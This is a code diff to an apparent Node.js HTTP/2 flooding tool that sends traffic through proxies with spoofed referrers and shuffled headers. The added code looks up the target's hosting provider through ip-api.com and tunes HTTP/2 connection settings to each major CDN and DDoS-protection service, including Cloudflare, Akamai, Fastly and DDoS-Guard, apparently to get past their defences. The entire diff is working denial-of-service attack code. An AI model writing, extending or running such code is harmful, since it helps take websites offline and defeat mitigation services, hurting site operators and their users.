@@ -7,6 +7,8 @@
  const fs = require("fs");
  const os = require("os");
  const HPACK = require('hpack');
+ const dns = require('dns');
+ const util = require('util');
  let hpack = new HPACK();
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
@@ -231,6 +233,24 @@ class bexcoxnxx {
  }
 
 const refers = ['google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com'];
+let isp;
+const lookupPromise = util.promisify(dns.lookup);
+async function getIPAndISP(url) {
+    try {
+        const { address } = await lookupPromise(url);
+        const apiUrl = `http://ip-api.com/json/${address}`;
+        const response = await fetch(apiUrl);
+        if (response.ok) {
+            const data = await response.json();
+            isp = data.isp;
+        } else {
+            return;
+        }
+    } catch (error) {
+        return;
+    }
+}
+getIPAndISP(parsedTarget.host);
 const Socker = new bexcoxnxx();
  function bexFlooder() {
      let proxies = readLines(args.proxyFile);
@@ -415,6 +435,78 @@ let headersmemek = {
 ...shuffleObject(headersxnxx),
 ...shuffleObject(bexHeaders),
 }
+function getSettingsBasedOnISP(isp) {
+    const settings = {
+        headerTableSize: 65536,
+        initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
+        maxHeaderListSize: 262144,
+        enablePush: false,
+        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
+        maxFrameSize: 16384,
+        enableConnectProtocol: false,
+    };
+    if (isp === 'Cloudflare, Inc.') {
+        settings.priority = 1;
+        settings.headerTableSize = 65536;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxFrameSize = 16384;
+        settings.enableConnectProtocol = false;
+    } else if (isp === 'FDCservers.net' || isp === 'OVH SAS' || isp === 'VNXCLOUD') {
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 65536;
+        settings.maxFrameSize = 16777215;
+        settings.maxConcurrentStreams = 128;
+        settings.maxHeaderListSize = 4294967295;
+    } else if (isp === 'Akamai Technologies, Inc.' || isp === 'Akamai International B.V.') {
+        settings.priority = 1;
+        settings.headerTableSize = 65536;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxFrameSize = 16384;
+        settings.maxHeaderListSize = 32768;
+    } else if (isp === 'Fastly, Inc.' || isp === 'Optitrust GmbH') {
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 65535;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 4294967295;
+    } else if (isp === 'Ddos-guard LTD') {
+        settings.priority = 1;
+        settings.maxConcurrentStreams = 1;
+        settings.initialWindowSize = 65535;
+        settings.maxFrameSize = 16777215;
+        settings.maxHeaderListSize = 262144;
+    } else if (isp === 'Amazon.com, Inc.' || isp === 'Amazon Technologies Inc.') {
+        settings.priority = 0;
+        settings.maxConcurrentStreams = 100;
+        settings.initialWindowSize = 65535;
+        settings.maxHeaderListSize = 262144;
+    } else if (isp === 'Microsoft Corporation' || isp === 'Vietnam Posts and Telecommunications Group' || isp === 'VIETNIX') {
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 8388608;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 4294967295;
+    } else if (isp === 'Google LLC') {
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 137216;
+    } else {
+        settings.headerTableSize = 65535;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxHeaderListSize = 261144;
+        settings.maxFrameSize = 16384;
+    }
+    return settings;
+}
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
          connection.setKeepAlive(true, 60000);
@@ -443,13 +535,7 @@ let headersmemek = {
 		const client = http2.connect(parsedTarget.href, {
 		    protocol: "https:",
 	    	createConnection: () => tlsBex,
-			settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 100,
-                initialWindowSize: 65535,
-                maxFrameSize: 16384,
-                enablePush: false,
-               },
+			settings: getSettingsBasedOnISP(isp),
 	    	});
          client.setMaxListeners(0);
          client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
